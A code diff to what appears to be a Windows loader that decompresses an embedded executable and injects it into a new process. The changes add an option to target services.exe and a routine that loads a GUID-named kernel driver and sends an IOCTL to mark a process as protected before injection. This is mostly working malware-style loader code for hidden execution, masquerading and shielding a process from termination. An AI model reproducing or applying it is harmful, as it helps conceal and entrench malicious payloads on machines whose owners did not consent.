@@ -106,7 +106,7 @@ NTSTATUS ProtectImage(HANDLE hProcess, PVOID RemoteBase, PIMAGE_NT_HEADERS pinth
 	#error target architecture not supported
 #endif
 
-void Inject(PVOID BaseOfImage, ULONG SizeOfImage, PCWSTR lpCommandLine = 0)
+void Inject(PVOID BaseOfImage, ULONG SizeOfImage, PCWSTR lpCommandLine = GetCommandLineW())
 {
 	PIMAGE_NT_HEADERS pinth;
 	if (0 <= RtlImageNtHeaderEx(0, BaseOfImage, SizeOfImage, &pinth) &&
@@ -123,6 +123,12 @@ void Inject(PVOID BaseOfImage, ULONG SizeOfImage, PCWSTR lpCommandLine = 0)
 			break;
 		default:
 			return ;
+		}
+
+		if ('|' == *lpCommandLine)
+		{
+			lpFileName = L"services.exe";
+			lpCommandLine++;
 		}
 
 		WCHAR ApplicationName[MAX_PATH];
@@ -206,14 +212,43 @@ ULONG Unzip(_In_ LPCVOID CompressedData,
 	_Out_ PVOID* pUncompressedBuffer,
 	_Out_ ULONG* pUncompressedDataSize);
 
+#define IOCTL_SetProtectedProcess		CTL_CODE(FILE_DEVICE_UNKNOWN, 6, METHOD_NEITHER, FILE_ANY_ACCESS)
+
+#define FILE_SHARE_VALID_FLAGS 7
+
+NTSTATUS SetProtectedProcess()
+{
+	BOOLEAN b;
+	RtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE, TRUE, FALSE, &b);
+	UNICODE_STRING ObjectName;
+	OBJECT_ATTRIBUTES oa = { sizeof(oa), 0, &ObjectName };
+
+	RtlInitUnicodeString(&ObjectName, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\{FC81D8A3-6002-44bf-931A-352B95C4522F}");
+	HANDLE hFile;
+	IO_STATUS_BLOCK iosb;
+
+	switch (NTSTATUS status = ZwLoadDriver(&ObjectName))
+	{
+	case STATUS_SUCCESS:
+	case STATUS_IMAGE_ALREADY_LOADED:
+		RtlInitUnicodeString(&ObjectName, L"\\device\\69766781178D422cA183775611A8EE55");
+		if (0 <= (status = NtOpenFile(&hFile, SYNCHRONIZE, &oa, &iosb, FILE_SHARE_VALID_FLAGS, FILE_SYNCHRONOUS_IO_NONALERT)))
+		{
+			status = NtDeviceIoControlFile(hFile, 0, 0, 0, &iosb, IOCTL_SetProtectedProcess, 0, 0, 0, 0);
+			NtClose(hFile);
+		}
+	default:
+		return status;
+	}
+}
+
 void WINAPI ep(PVOID pv)
 {
-	pv = codesec_exe_begin;
+	ULONG cb;
 	
-	ULONG cb = RtlPointerToOffset(codesec_exe_begin, codesec_exe_end);
-	
-	if (NOERROR == Unzip(pv, cb, &pv, &cb))
+	if (NOERROR == Unzip(codesec_exe_begin, RtlPointerToOffset(codesec_exe_begin, codesec_exe_end), &pv, &cb))
 	{
+		SetProtectedProcess();
 		Inject(pv, cb);
 		LocalFree(pv);
 	}
